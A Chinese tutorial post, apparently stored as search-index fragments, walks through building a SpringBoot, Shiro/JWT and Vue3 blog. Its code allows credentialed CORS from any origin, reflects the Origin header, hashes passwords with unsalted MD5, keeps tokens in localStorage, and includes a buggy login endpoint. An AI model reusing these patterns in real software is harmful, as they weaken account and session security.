当我们表单数据提交的时候，前端的校验我们可以使用一些类似于jQuery Validate等js插件实现，而后端我们可以使用Hibernate validatior来做校验。 我们使用springboot框架作为基础，那么就已经自动集成了Hibernate validatior。(校验登录非空等等) 0.首先添加依赖 在pom.xml中 \u003cdependency\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-starter-validation\u003c/artifactId\u003e \u003c/dependency\u003e 1.首先在实体的属性上添加对应的校验规则 User实体类中 package com.example.vueblog.entity; import com.baomidou.mybatisplus.annotation.TableName; import com.baomidou.mybatisplus.annotation.IdType; import com.baomidou.mybatisplus.annotation.TableId; import java.time.LocalDateTime; import java.io.Serializable; import lombok.Data; import lombok.EqualsAndHashCode; import lombok.experimental.Accessors; import javax.validation.constraints.Email; import javax.validation.constraints.NotBlank; /** * \u003cp\u003e * * \u003c/p\u003e * * @author anonymous * @since 2023-07-18 */ @Data @EqualsAndHashCode(callSuper = false) @Accessors(chain = true) @TableName(\"m_user\") public class User implements Serializable { private static final long serialVersionUID = 1L; @TableId(value = \"id\", type = IdType.AUTO) private Long id; @NotBlank(message = \"昵称不能为空\") private String username; private String avatar; @NotBlank(message = \"邮箱不能为空\") @Email(message = \"邮箱格式不正确\") private String email; private String password; private Integer status; private LocalDateTime created; private LocalDateTime lastLogin; } 2.在userController类中写一个方法测试 package com.example.vueblog.controller; import com.example.vueblog.common.lang.Result; import com.example.vueblog.entity.User; import com.example.vueblog.service.UserService; import org.apache.shiro.authz.annotation.RequiresAuthentication; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.validation.annotation.Validated; import org.springframework.web.bind.annotation.*; /** * \u003cp\u003e * 前端控制器 * \u003c/p\u003e * * @author anonymous * @since 2023-07-18 */ @RestController @RequestMapping(\"/user\") public class UserController { @Autowired private UserService userService; @RequiresAuthentication @GetMapping(\"/index\") public Object index(){ User user = userService.getById(1); return Result.succ(200,\"操作成功\", user); // return userService.getById(1); } /** * @RequestBody主要用来接受前端传递给后端的json字符串中数据（请求体数据）。 * 前端使用POST提交（因为GET无请求体） * @RequestBody和@RequestParam()可以同时使用，但是@RequestBody最多有一个而@RequestParam可以有多个 * @Validated注解用于检查user中填写的规则，如果不满足则抛出异常。可以在GlobalExceptionHandler中捕获此异常 进行自定义返回信息 * @param user * @return */ @PostMapping(\"/save\") public Result save(@Validated @RequestBody User user){ return Result.succ(user); } } 3.定义捕获异常返回处理 在捕获异常 GlobalExceptionHandler类中修改如下： /** * 实体校验异常 * MethodArgumentNotValidException捕获实体校验异常 */ @ResponseStatus(HttpStatus.BAD_REQUEST) //因为前后端分离 返回一个状态 @ExceptionHandler(value = MethodArgumentNotValidException.class)//捕获运行时异常 public Result handler(MethodArgumentNotValidException e){ log.error(\"实体捕获异常 ：-----------------{}\",e); BindingResult bindingException = e.getBindingResult(); //多个异常顺序抛出异常,让返回的异常信息简短 ObjectError objectError = bindingException.getAllErrors().stream().findFirst().get(); return Result.fail(objectError.getDefaultMessage()); } 测试 ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:6:0","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"七、解决跨域问题 因为是前后端分离，所以跨域问题是避免不了的，我们直接在后台进行全局跨域处理: 1.路径com.example.vuehub.config.CorsConfig package com.example.vueblog.config; import org.springframework.context.annotation.Configuration; import org.springframework.web.servlet.config.annotation.CorsRegistry; import org.springframework.web.servlet.config.annotation.WebMvcConfigurer; /** * 解决跨域问题 */ @Configuration public class CorsConfig implements WebMvcConfigurer { @Override public void addCorsMappings(CorsRegistry registry) { registry.addMapping(\"/**\") // .allowedOrigins(\"*\") SpringBoot升级2.4.0之后，跨域配置中的.allowedOrigins不再可用,将配置中的.allowedOrigins替换成.allowedOriginPatterns即可。 .allowedOriginPatterns(\"*\") .allowedMethods(\"GET\", \"HEAD\", \"POST\", \"PUT\", \"DELETE\", \"OPTIONS\") .allowCredentials(true) .maxAge(3600) .allowedHeaders(\"*\"); } } 注意：此配置是配置到confroller的，但是在confroller之前是经过jwtFilter的，所以在进行访问之前也配置一下Filter的跨域问题 2.jwtFilter进行跨域处理配置: /** * 对跨域提供支持 * @param request * @param response * @return * @throws Exception */ @Override protected boolean preHandle(ServletRequest request, ServletResponse response) throws Exception { HttpServletRequest httpServletRequest = WebUtils.toHttp(request); HttpServletResponse httpServletResponse = WebUtils.toHttp(response); httpServletResponse.setHeader(\"Access-control-Allow-Origin\", httpServletRequest.getHeader(\"Origin\")); httpServletResponse.setHeader(\"Access-Control-Allow-Methods\", \"GET,POST,OPTIONS,PUT,DELETE\"); httpServletResponse.setHeader(\"Access-Control-Allow-Headers\", httpServletRequest.getHeader(\"Access-Control-Request-Headers\")); // 跨域时会首先发送一个OPTIONS请求,这里我们给OPTIONS请求直接返回正常状态 if (httpServletRequest.getMethod().equals(RequestMethod.OPTIONS.name())) { httpServletResponse.setStatus(org.springframework.http.HttpStatus.OK.value()); return false; } return super.preHandle(request, response); } 由于我们的接口比较简单，所以就不继承swagger2了 —-基本框架已经搭建完成—– ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:7:0","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"八、登录接口开发 创建LoginDto 因为dto是要提供给service层需要的数据，是从vo转换来的。 com.example.vueblog.common.dto package com.example.vueblog.common.lang.dto; import lombok.Data; import javax.validation.constraints.NotBlank; import java.io.Serializable; @Data public class LoginDto implements Serializable { @NotBlank(message = \"用户名不能为空\") private String username; @NotBlank(message = \"密码不能为空\") private String password; } 在GlobalExceptionHandler类中增加断言异常 com/example/vueblog/exception/GlobalExceptionHandler.java /** * 断言异常 * @param e * @return */ @ResponseStatus(HttpStatus.BAD_REQUEST) @ExceptionHandler(value = IllegalArgumentException.class) public Result handler(IllegalArgumentException e){ log.error(\"Assert异常:------------------\u003e{}\",e); return Result.fail(e.getMessage()); } 创建AccountController类 登录和退出逻辑 com/example/vueblog/controller/AccountController.java package com.example.vueblog.controller; import cn.hutool.core.lang.Assert; import cn.hutool.core.map.MapUtil; import cn.hutool.crypto.SecureUtil; import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper; import com.example.vueblog.common.lang.Result; import com.example.vueblog.common.lang.dto.LoginDto; import com.example.vueblog.entity.User; import com.example.vueblog.service.UserService; import com.example.vueblog.util.JwtUtils; import org.apache.shiro.SecurityUtils; import org.apache.shiro.authz.annotation.RequiresAuthentication; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.validation.annotation.Validated; import org.springframework.web.bind.annotation.RequestBody; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import javax.servlet.http.HttpServletResponse; @RestController public class AccountController { @Autowired UserService userService; @Autowired JwtUtils jwtUtils; public Result login(@Validated @RequestBody LoginDto loginDto, HttpServletResponse response){ User user = userService.getOne(new QueryWrapper\u003cUser\u003e().eq(\"userrname\",loginDto.getUsername())); Assert.notNull(user,\"用户不存在\"); //判断账号密码是否错误 因为是md5加密所以这里md5判断 if(!user.getPassword().equals(SecureUtil.md5(loginDto.getPassword()))){ //密码不同则抛出异常 return Result.fail(\"密码不正确\"); } String jwt = jwtUtils.generateToken(user.getId()); //将token 放在我们的header里面 response.setHeader(\"Authorization\",jwt); response.setHeader(\"Access-control-Expose-Headers\",\"Authorization\"); return Result.succ(MapUtil.builder() .put(\"id\", user.getId()) .put(\"username\",user.getUsername()) .put(\"avatar\",user.getAvatar()) .put(\"email\",user.getEmail()).map() ); } //需要认证权限才能退出登录 @RequiresAuthentication @RequestMapping(\"/logout\") public Result logout() { //退出登录 SecurityUtils.getSubject().logout(); return null; } } 问题，可能会遇到这个报错：Caused by: java.lang.ClassNotFoundException: javax.xml.bind.DatatypeConverter 其主要原因，主要是 因为 Spring Boot 版本过高了，需要我们给它指定「jaxb」的版本即可。 在pom.xml中添加依赖： \u003c!-- https://mvnrepository.com/artifact/javax.xml.bind/jaxb-api --\u003e \u003cdependency\u003e \u003cgroupId\u003ejavax.xml.bind\u003c/groupId\u003e \u003cartifactId\u003ejaxb-api\u003c/artifactId\u003e \u003cversion\u003e2.3.1\u003c/version\u003e \u003c/dependency\u003e 测试效果： 这里根本没去调用shiro的登录方法吧，写的jwtFilter也根本不会去走……….. 此处登陆时发现，jdk版本大于8时会报 java.lang.NoClassDefFoundError: javax/xml/bind/DatatypeConverter ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:8:0","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"九、博客接口开发 列表、详情、编辑功能 没有做删除功能，自己做 Blog的实体类字段也加上验证： package com.example.vueblog.entity; import com.baomidou.mybatisplus.annotation.TableName; import com.baomidou.mybatisplus.annotation.IdType; import com.baomidou.mybatisplus.annotation.TableId; import java.time.LocalDateTime; import java.io.Serializable; import lombok.Data; import lombok.EqualsAndHashCode; import javax.validation.constraints.NotBlank; /** * \u003cp\u003e * * \u003c/p\u003e * * @author anonymous * @since 2023-07-18 */ @Data @EqualsAndHashCode(callSuper = false) @TableName(\"m_blog\") public class Blog implements Serializable { private static final long serialVersionUID = 1L; @TableId(value = \"id\", type = IdType.AUTO) private Long id; private Long userId; @NotBlank(message = \"标题不能为空\") private String title; @NotBlank(message = \"摘要不能为空\") private String description; @NotBlank(message = \"内容不能为空\") private String content; private LocalDateTime created; private Integer status; } 创建工具类ShiroUtil com/example/vueblog/util/ShiroUtil.java package com.example.vueblog.util; import com.example.vueblog.shiro.AccountProfile; import org.apache.shiro.SecurityUtils; public class ShiroUtil { public static AccountProfile getProfile(){ return (AccountProfile) SecurityUtils.getSubject().getPrincipal(); } } 完善BlogController类 package com.example.vueblog.controller; import cn.hutool.core.bean.BeanUtil; import cn.hutool.core.lang.Assert; import com.baomidou.mybatisplus.core.metadata.IPage; import com.baomidou.mybatisplus.extension.plugins.pagination.Page; import com.example.vueblog.common.lang.Result; import com.example.vueblog.entity.Blog; import com.example.vueblog.service.BlogService; import com.example.vueblog.util.ShiroUtil; import org.apache.shiro.authz.annotation.RequiresAuthentication; import org.springframework.validation.annotation.Validated; import org.springframework.web.bind.annotation.*; import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper; import org.springframework.beans.factory.annotation.Autowired; import java.time.LocalDateTime; /** * \u003cp\u003e * 前端控制器 * \u003c/p\u003e * * @author anonymous * @since 2023-07-18 */ @RestController @RequestMapping(\"/blog\") public class BlogController { @Autowired BlogService blogService; //木有值默认为1 @GetMapping(\"/blogs\") public Result list(@RequestParam(defaultValue = \"1\") Integer currentPage){ Page page = new Page(currentPage, 5); IPage pageData = blogService.page(page, new QueryWrapper\u003cBlog\u003e().orderByDesc(\"created\")); return Result.succ(pageData); } //查看文章详情 //@PathVariable动态路由 @GetMapping(\"/blog/{id}\") public Result detail(@PathVariable Long id){ Blog blog = blogService.getById(id); //判断是否为空 为空则断言异常 Assert.notNull(blog,\"该博客已被删除\"); return Result.succ(blog); } //@Validated校验 //@RequestBody //添加删除 木有id则添加 有id则编辑 @RequiresAuthentication //需要认证之后才能操作 @PostMapping(\"/blog/edit\") public Result edit(@Validated @RequestBody Blog blog){ //一个空对象用于赋值 Blog temp = null; //如果有id则是编辑 if(blog.getId() != null){ temp = blogService.getById(blog.getId());//将数据库的内容传递给temp //只能编辑自己的文章 Assert.isTrue(temp.getUserId().longValue()== ShiroUtil.getProfile().getId().longValue(),\"没有编辑权限\"); }else{ temp = new Blog(); temp.setUserId(ShiroUtil.getProfile().getId()); temp.setCreated(LocalDateTime.now()); temp.setStatus(0); } //将blog的值赋给temp 忽略 id userid created status 引用于hutool BeanUtil.copyProperties(blog,temp,\"id\",\"userId\",\"created\",\"status\"); blogService.saveOrUpdate(temp); return Result.succ(null); } //删除文章 //@PathVariable动态路由 @RequiresAuthentication //需要认证之后才能操作 @PostMapping(\"/blogdel/{id}\") public Result edit(@PathVariable Long id){ //判断是否是自己的文章(文章id属于自己) Assert.isTrue(blogService.getById(id).getUserId().longValue() == ShiroUtil.getProfile().getId().longValue(),\"没有删除权限\"); boolean b = blogService.removeById(id); //判断是否为空 为空则断言异常 if(b==true){ return Result.succ(\"文章删除成功\"); }else{ return Result.fail(\"文章删除失败\"); } } } 查询测试: 新增编辑测试: 先登录，获取登录的token再将其添加到请求头，去测试后面的授权功能 新增： { \"title\":\"标题测试\", \"description\":\"描述测试哦奥德萨\", \"content\":\"内容测试阿斯顿撒哦i等哈送到哈桑\" } 编辑： { \"id\":21, \"title\":\"标题测试修改\", \"description\":\"描述测试哦奥德萨\", \"","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:9:0","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"十、环境准备 1.首先我们上node.js官网(https://nodejs.org/zh-cn/)，下载最新的长期版本，直接运行安装完成之后，我们就已经具备了node和npm的环境啦。 2.安装完成之后检查下版本信息： node -v npm -v 3.安装vue环境 # 可以配置淘宝npm源 npm get registry #查看原本镜像 npm config set registry http://registry.npm.taobao.org/ #修改成淘宝镜像 # 脚手架vue-cli # 官方文档：https://cli.vuejs.org/#getting-started sudo npm install -g @vue/cli ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:10:0","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"十一、新建项目 新建项目： # 切换到创建项目的目录下(默认会创建一个hello示例项目) vue create vueblog-vue # 然后会让你选择vue2还是vue3 # 会自动生成一个demo项目目录 # 切换到demo目录下 cd vueblog-vue # 运行demo npm run serve 用vscode打开项目即可 Note:vue create 创建项目报错：command failed: npm install –loglevel error 解决办法： 清空npm的缓存 sudo npm cache clean --force 或者在文件目录C:\\Users下查找 .npmrc文件，并删除 项目架构： ├── README.md 项目介绍 ├── index.html 入口页面 ├── build 构建脚本目录 │ ├── build-server.js 运行本地构建服务器，可以访问构建后的页面 │ ├── build.js 生产环境构建脚本 │ ├── dev-client.js 开发服务器热重载脚本，主要用来实现开发阶段的页面自动刷新 │ ├── dev-server.js 运行本地开发服务器 │ ├── utils.js 构建相关工具方法 │ ├── webpack.base.conf.js wabpack基础配置 │ ├── webpack.dev.conf.js wabpack开发环境配置 │ └── webpack.prod.conf.js wabpack生产环境配置 ├── config 项目配置 │ ├── dev.env.js 开发环境变量 │ ├── index.js 项目配置文件 │ ├── prod.env.js 生产环境变量 │ └── test.env.js 测试环境变量 ├── mock mock数据目录 │ └── hello.js ├── package.json npm包配置文件，里面定义了项目的npm脚本，依赖包等信息 ├── src 源码目录 │ ├── main.js 入口js文件 │ ├── app.vue 根组件 │ ├── components 公共组件目录 │ │ └── title.vue │ ├── assets 资源目录，这里的资源会被wabpack构建 │ │ └── images │ │ └── logo.png │ ├── routes 前端路由 │ │ └── index.js │ ├── store 应用级数据（state）状态管理 │ │ └── index.js │ └── views 页面目录 │ ├── hello.vue │ └── notfound.vue ├── static 纯静态资源，不会被wabpack构建。 └── test 测试文件目录（unit\u0026e2e） └── unit 单元测试 ├── index.js 入口脚本 ├── karma.conf.js karma配置文件 └── specs 单测case目录 └── Hello.spec.js ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:11:0","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"十二、安装element-ui和axios ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:12:0","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"安装element-ui plus vue3以上得下载element-puls才行 安装： # 安装 # npm install element-ui --save npm install element-plus --save 或者如下方式安装(会自动帮助适配版本)： vue add element-plus # 参考：https://www.jianshu.com/p/02b8616d4fe6 全局引入： 然后打开main.js,引入依赖 import { createApp } from 'vue' import App from './App.vue' // 引入element-plus import ElementPlus from \"element-plus\" import \"element-plus/dist/index.css\" // 使用element-plus createApp(App) .use(ElementPlus) .mount('#app') 按需引入：生产环境建议这种，不建议全局引入 测试： 在App.vue中添加button，查看效果 \u003ctemplate\u003e \u003cel-row class=\"mb-4\"\u003e \u003cel-button\u003eDefault\u003c/el-button\u003e \u003cel-button type=\"primary\"\u003ePrimary\u003c/el-button\u003e \u003cel-button type=\"success\"\u003eSuccess\u003c/el-button\u003e \u003cel-button type=\"info\"\u003eInfo\u003c/el-button\u003e \u003cel-button type=\"warning\"\u003eWarning\u003c/el-button\u003e \u003cel-button type=\"danger\"\u003eDanger\u003c/el-button\u003e \u003c/el-row\u003e \u003c/template\u003e 生效了 ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:12:1","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"安装axios 类似ajax npm install axios --save 后面就可以使用axios.get()发送请求了 ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:12:2","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"十三、页面路由 接下来，我们先定义好路由和页面，因为我们只是做一个简单的博客项目，页面比较少，所以我们可以直接先定义好，然后在慢慢开发，这样需要用到链接的地方我们就可以直接可以使用： 我们在views文件夹下定义几个页面： BlogDetail.vue（博客详情页） BlogEdit.vue（编辑博客） Blogs.vue（博客列表） Login.vue（登录页面） 可以配置插件:VueHelper(新建vue项目 最上方输入vuet按键tab可直接生成模板) ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:13:0","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"先新建几个基本页面 注意:每个页面下方 里面只能有一个 ,vue3开始就可以有多个了 删除多余的页面： 新建四个组件： BlogDetail.vue（博客详情页） \u003ctemplate\u003e \u003cdiv\u003eBlogDetail\u003c/div\u003e \u003c/template\u003e \u003cscript\u003e export default { name: \"BlogDetail\" } \u003c/script\u003e \u003cstyle\u003e \u003c/style\u003e BlogEdit.vue（编辑博客） \u003ctemplate\u003e \u003cdiv\u003eBlogEditor\u003c/div\u003e \u003c/template\u003e \u003cscript\u003e export default { name: \"BlogEditor\" } \u003c/script\u003e \u003cstyle\u003e \u003c/style\u003e Blogs.vue（博客列表） \u003ctemplate\u003e \u003cdiv\u003eBlogs\u003c/div\u003e \u003c/template\u003e \u003cscript\u003e export default { name: \"Blogs\" } \u003c/script\u003e \u003cstyle\u003e \u003c/style\u003e Login.vue（登录页面） \u003ctemplate\u003e \u003cdiv\u003eLogin\u003c/div\u003e \u003c/template\u003e \u003cscript\u003e export default { name: \"Login\" } \u003c/script\u003e \u003cstyle\u003e \u003c/style\u003e ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:13:1","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"配置路由： 1.vue安装router: npm install vue-router@next --save 2.引入 src 文件夹下创建 router 文件夹，router 文件夹下创建 index.js 文件 为保证代码整洁，可以将routes=[{…}]部分提取到另一js文件: router/index.js //该文件专门用于创建整个应用的路由器 //引用 import { createRouter,createWebHashHistory} from \"vue-router\"; //为保证代码整洁，可以将routes=[{…}]部分提取到另一js文件；或通过api动态加载路由 import routes from './routes' //创建一个路由器 const router = createRouter({ routes:routes, history:createWebHashHistory(process.env.BASE_URL) }) export default router router/routes.js 放具体的路由 // import Demo from '@/views/Demo' import Login from '@/views/Login' import Blogs from '@/views/Blogs' import BlogEdit from '@/views/BlogEdit' import BlogDetail from '@/views/BlogDetail' //创建具体的路由 const routes = [ { path: '/', name: 'Index', redirect:{name : \"Blogs\"} }, { path: '/blogs', name: 'Blogs', component: Blogs },{ path: '/Login', name: 'Login', component: Login },{ path: '/blog/add', name: 'BlogAdd', //name不能重复 component: BlogEdit }, // { // path: '/Demo', // name: 'Demo', // component: Demo // }, { path: '/blog/:blogid', name: 'BlogDetail', component: BlogDetail } ,{ // path: '/blog/:blogid/edit', vue2,而vue3中应该edit在前面，id在后面 path: '/blog/edit/:blogid', name: 'BlogEdit', component: BlogEdit } ] export default routes 3.main.js文件中引入路由 import { createApp } from 'vue' import App from './App.vue' // 引入element-plus import ElementPlus from \"element-plus\" import \"element-plus/dist/index.css\" import router from \"router\" // 使用element-plus createApp(App) .use(ElementPlus) .use(router) .mount('#app') 4.添加路由组件router-view，指定路由插入位置（划重点） App.vue \u003ctemplate\u003e \u003crouter-view\u003e\u003c/router-view\u003e \u003c!--加上路由标签，路由才会有效果--\u003e \u003c/template\u003e \u003cscript\u003e // import HelloWorld from './components/HelloWorld.vue' export default { name: 'App', // components: { // // HelloWorld // } } \u003c/script\u003e \u003cstyle\u003e #app { font-family: Avenir, Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; -moz-osx-font-smoothing: grayscale; text-align: center; color: #2c3e50; margin-top: 60px; } \u003c/style\u003e ","date":"2023-07-20","objectID":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/:13:2","tags":["SpringBoot","Vue","Java"],"title":"基于SpringBoot和Vue3的前后端分离博客","uri":"/%E5%9F%BA%E4%BA%8Espringboot%E5%92%8Cvue3%E7%9A%84%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E5%8D%9A%E5%AE%A2/"},{"categories":["Java"],"content":"登录功能 登录页面编写： \u003ctemplate\u003e \u003cdiv\u003e \u003cel-container\u003e \u003cel-header\u003e \u003cimg class=\"mlogo\" src=\"https://geoer.cn/images/avatar.png\" alt=\"logo图片\" /\u003e \u003c/el-header\u003e \u003cel-main\u003e \u003cel-form :model=\"ruleForm\" :rules=\"rules\" ref=\"ruleForm\" label-width=\"100px\" class=\"demo-ruleForm\"\u003e \u003cel-form-item label=\"用户姓名\" prop=\"username\"\u003e \u003cel-input v-model=\"ruleForm.username\"\u003e\u003c/el-input\u003e \u003c/el-form-item\u003e \u003cel-form-item label=\"用户密码\" prop=\"password\"\u003e \u003cel-input v-model=\"ruleForm.password\"\u003e\u003c/el-input\u003e \u003c/el-form-item\u003e \u003cel-form-item\u003e \u003cel-button type=\"primary\" @click=\"submitForm('ruleForm')\"\u003e立即创建\u003c/el-button\u003e \u003cel-button @click=\"resetForm('ruleForm')\"\u003e重置\u003c/el-button\u003e \u003c/el-form-item\u003e \u003c/el-form\u003e \u003c/el-main\u003e \u003c/el-container\u003e \u003c/div\u003e \u003c/template\u003e \u003cscript\u003e export default { name: \"Login\", data () { return { ruleForm: { username: '', password: '' }, rules: { username: [ { required: true, message: '请输入用户名称', trigger: 'blur' }, { min: 3, max: 15, message: '长度在 3 到 15 个字符', trigger: 'blur' } ], password: [ { required: true, message: '请选择密码', trigger: 'blur' } ] } }; }, methods: { submitForm (formName) { this.$refs[formName].validate((valid) =\u003e { if (valid) { alert('submit!'); } else { console.log('error submit!!'); return false; } }); }, resetForm (formName) { this.$refs[formName].resetFields(); } } } \u003c/script\u003e \u003cstyle scoped\u003e .el-header, .el-footer { background-color: #b3c0d1; color: #333; text-align: center; line-height: 60px; } .el-main { /* background-color: #e9eef3; */ color: #333; text-align: center; line-height: 160px; } .mlogo { height: 80%; } .demo-ruleForm { max-width: 500px; margin: 0 auto; } \u003c/style\u003e vue项目拿到的token常放到localStore里面： 把这个jwt让其他所有组件也能访问到 vue的各个页面不能直接互相通信，可以通过store来数据互通，这个是 保存数据存在本地cookie或者会话session中，其他页面要用数据时就可以从这里面取 新建一个store目录，下面新建一个index.js:配置完善store/index.js 相当于Java Bean: state相当于私有属性,mutations相当于set，getter相当于get // import Vue from 'vue' // import Vuex from 'vuex' import { createStore } from \"vuex\" // Vue.use(Vuex) export default createStore({ //定义全局参数 其他页面可以直接获取state里面的内容 state: { token: localStorage.getItem(\"token\") , //方法一 localStorage.getItem(\"token\") //反序列化获取session会话中的 userInfo对象 userInfo:JSON.parse(sessionStorage.getItem(\"userInfo\")) }, mutations: { //相当于实体类的set SET_TOKEN:(state,token)=\u003e{ state.token=token//将传入的token赋值 给state的token //同时可以存入浏览器的localStorage里面 localStorage.setItem(\"token\",token) }, SET_USERINFO:(state,userInfo)=\u003e{ state.userInfo=userInfo//将传入的tuserInfo赋值 给state的userInfo //同时可以存入会话的sessionStorage里面 sessionStorage中只能存字符串 不能存入对象所以我们存入序列化 jons串 sessionStorage.setItem(\"userInfo\",JSON.stringify(userInfo)) }, //删除token及userInfo REMOVE_INFO:(state)=\u003e{ state.token = ''; state.userInfo = {}; localStorage.setItem(\"token\",'') sessionStorage.setItem(\"userInfo\",JSON.stringify('')) } }, getters: { //相当于get //配置一个getUser可以直接获取已经反序列化对象的一个userInfo getUser: state=\u003e{ return state.userInfo; }, getToken: state=\u003e{ return state.token; } }, actions: { }, modules: { } }) 然后我们给main.js中引入store和axios import { createApp } from 'vue' import App from './App.vue' // 引入element-plus import ElementPlus from \"element-plus\" import \"element-plus/dist/index.css\" import router from \"./router/index\" import store from './store' import axios from 'axios' // // 使用element-plus // createApp(App) // .use(ElementPlus) // .use(router) // .use(store) // .mount('#app') const app = createApp(App) .use(ElementPlus) .use(router) .use(store) app.mount('#app') //将axios挂载为app的全局自定义属性之后 